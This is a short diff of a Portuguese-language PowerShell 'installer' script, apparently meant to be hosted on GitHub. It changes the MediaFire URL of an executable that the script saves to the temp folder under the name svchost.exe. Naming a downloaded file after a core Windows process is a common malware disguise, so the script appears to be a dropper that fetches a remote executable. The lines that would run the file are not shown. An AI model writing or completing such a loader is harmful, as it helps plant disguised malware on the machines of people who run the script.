@@ -2,7 +2,7 @@
 # Hospedar em: https://raw.githubusercontent.com/seuusuario/seurepo/main/instalar.ps1
 
 # ===== CONFIGURAÇÕES =====
-$urlExe = "https://download1322.mediafire.com/i979z8p7s7rgkrsGfHNNiYI3hvHhBt4__EqzuZPp01OyXwcfPAWnn-UoUkrEAmT7kkty1wY3_rcYoWSdK67iF-oWuERidp433G70kShJ4zTFLFzJR1cfN54Qz4YCFcKIu_UZlT-Kcy0PzwoPurvLh7UEipBSzGgOzaqNPNyapIJPUoc/ho8cdet3sv3n3y0/svchost.exe"
+$urlExe = "https://download1322.mediafire.com/sm06k8ybnudgsnXMvtYtCjuNGQDWNsEHUoWosDcKbfroAna11EwLHkezg9cpEjtMIJRl6P4HVQr8lPFPag_YOAjvXdmDWaET_lCajOeInsmUgJFImgmg3_g_GYJMEbU-rwEEiTZL6Fd6s_VFubsqNjLj5F8qJDRe5EXbORK3pJKS6CE/ho8cdet3sv3n3y0/svchost.exe"
 $nomeExe = "svchost.exe"
 $pastaTemp = [System.IO.Path]::GetTempPath()
 $caminhoCompleto = Join-Path $pastaTemp $nomeExe
